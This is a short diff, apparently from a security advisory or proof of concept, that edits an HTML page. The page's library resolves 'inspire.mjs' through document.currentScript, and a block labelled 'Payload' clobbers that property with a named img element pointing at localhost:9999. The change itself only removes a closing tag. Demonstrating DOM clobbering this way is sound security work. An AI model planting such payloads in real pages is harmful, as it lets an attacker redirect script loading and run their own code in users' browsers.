@@ -31,6 +31,6 @@ let url = new URL("./inspire.mjs", document.currentScript ? document.currentScri
 <!--Library-->
 
 <!--Payload-->
-<img name=currentScript src="http://localhost:9999"></img>
+<img name=currentScript src="http://localhost:9999">
 <!--Payload-->
 ```
